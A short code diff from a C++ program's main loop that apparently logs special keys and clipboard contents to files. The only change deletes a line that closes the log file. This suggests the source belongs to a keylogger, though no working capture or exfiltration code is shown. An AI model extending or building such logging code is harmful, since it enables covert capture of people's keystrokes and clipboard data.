@@ -45,7 +45,6 @@ int main(int argc, char * argv[])
 			k.SpecialKeys(logFile);
 			cp.GetClipboard(clipFile);
 		}
-		logFile.close();
 	}
 	system("pause");
 	return 0;
